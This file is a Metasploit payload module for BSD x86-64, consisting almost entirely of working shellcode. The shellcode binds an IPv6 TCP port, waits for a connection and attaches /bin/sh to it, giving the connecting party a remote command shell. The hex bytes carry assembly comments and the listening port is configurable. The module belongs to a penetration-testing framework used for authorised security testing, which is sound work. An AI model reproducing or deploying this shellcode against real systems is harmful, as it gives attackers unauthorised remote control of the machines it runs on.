##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 90

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD x64 Command Shell, Bind TCP Inline (IPv6)',
      'Description'   => 'Listen for a connection and spawn a command shell over IPv6',
      'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',
      'References'    => ['URL', 'https://github.com/earthquake/shellcodes/blob/master/x86_64_bsd_ipv6_bind_tcp.asm.c'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 20, 'n' ],
            },
          'Payload' =>
            "\x6a\x61"             + #   pushq  $0x61                       #
            "\x58"                 + #   pop    %rax                        #
            "\x99"                 + #   cltd                               #
            "\x6a\x1c"             + #   pushq  $0x1c                       #
            "\x5f"                 + #   pop    %rdi                        #
            "\x6a\x01"             + #   pushq  $0x1                        #
            "\x5e"                 + #   pop    %rsi                        #
            "\x0f\x05"             + #   syscall                            #
            "\x48\x97"             + #   xchg   %rax,%rdi                   #
            "\x52"                 + #   push   %rdx                        #
            "\x52"                 + #   push   %rdx                        #
            "\x52"                 + #   push   %rdx                        #
            "\xba\x00\x1c\x11\x5C" + #   mov edx,0x5c111c00                 #
            "\x52"                 + #   push   %rdx                        #
            "\x48\x89\xe6"         + #   mov    %rsp,%rsi                   #
            "\x6a\x1c"             + #   pushq  $0x1c                       #
            "\x5a"                 + #   pop    %rdx                        #
            "\x04\x4c"             + #   add    $0x4c,%al                   #
            "\x0f\x05"             + #   syscall                            #
            "\x48\x31\xf6"         + #   xor    %rsi,%rsi                   #
            "\x6a\x6a"             + #   pushq  $0x6a                       #
            "\x58"                 + #   pop    %rax                        #
            "\x0f\x05"             + #   syscall                            #
            "\x99"                 + #   cltd                               #
            "\x04\x1e"             + #   add    $0x1e,%al                   #
            "\x0f\x05"             + #   syscall                            #
            "\x48\x89\xc7"         + #   mov    %rax,%rdi                   #
            "\x6a\x5a"             + #   pushq  $0x5a                       #
            "\x58"                 + #   pop    %rax                        #
            "\x0f\x05"             + #   syscall                            #
            "\xff\xc6"             + #   inc    %esi                        #
            "\x04\x5a"             + #   add    $0x5a,%al                   #
            "\x0f\x05"             + #   syscall                            #
            "\xff\xc6"             + #   inc    %esi                        #
            "\x04\x59"             + #   add    $0x59,%al                   #
            "\x0f\x05"             + #   syscall                            #
            "\x52"                 + #   push   %rdx                        #
            "\x48\xbf\x2f\x2f\x62" + #   mov "//b"                          #
            "\x69\x6e\x2f\x73\x68" + #   mov "in/sh",%rdi                   #
            "\x57"                 + #   push   %rdi                        #
            "\x48\x89\xe7"         + #   mov    %rsp,%rdi                   #
            "\x52"                 + #   push   %rdx                        #
            "\x57"                 + #   push   %rdi                        #
            "\x48\x89\xe6"         + #   mov    %rsp,%rsi                   #
            "\x04\x39"             + #   add    $0x39,%al                   #
            "\x0f\x05"               #   syscall                            #
        }
      ))
  end
end
